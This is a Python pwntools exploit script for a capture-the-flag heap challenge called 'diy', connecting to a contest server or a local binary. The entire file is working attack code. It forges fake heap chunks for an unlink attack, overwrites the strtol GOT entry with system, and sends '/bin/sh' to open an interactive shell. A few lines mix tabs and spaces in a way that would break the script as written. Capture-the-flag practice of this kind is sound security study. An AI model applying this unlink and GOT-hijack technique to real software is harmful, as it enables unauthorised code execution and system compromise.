from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./diy")
	#libc = ELF("")
	elf = ELF("./diy")
else:
	p = remote("chal.420blaze.in","42002")
	elf = ELF("./diy")

def menu(choice):
	p.sendafter("Free\n> ",str(choice))

def add(index,size):
	menu(1)
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.recvuntil("Allocated: ")
	return int(p.recvuntil("\n",drop = True),16)

def show(index):
	menu(2)
	p.sendlineafter("Index: ",str(index))
	return p.recvuntil("\n",drop = True)

def edit(index,content):
	menu(3)
        p.sendlineafter("Index: ",str(index))
	p.sendafter("Data: ",content)

def free(index):
	menu(4)
        p.sendlineafter("Index: ",str(index))
        return p.recvuntil("Freed.\n")

def debugf():
	gdb.attach(p,"b *0x401180\nb *0x401E80\nb *0x401c10")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(1,0x70)
add(2,0x70)
add(0,0x100000000)
target = elf.got["strtol"]
heap_base = 0x405120
payload = p64(0x100) * 2 + p64(0x81) + p64(0x20)
payload += p64(0x70) + p64(0x10) + p64(heap_base + 0x20 - 0x18) + p64(heap_base + 0x20 - 0x10)
payload = payload.ljust(0x20 + 0x70,"\x00")
payload += p64(0x81) + p64(0x70)
edit(0,payload)
free(1)
payload = p64(0) + p64(target) + p64(0x100)
edit(2,payload)
payload = p64(elf.plt["system"])
edit(1,payload)
menu("/bin/sh")
p.interactive()
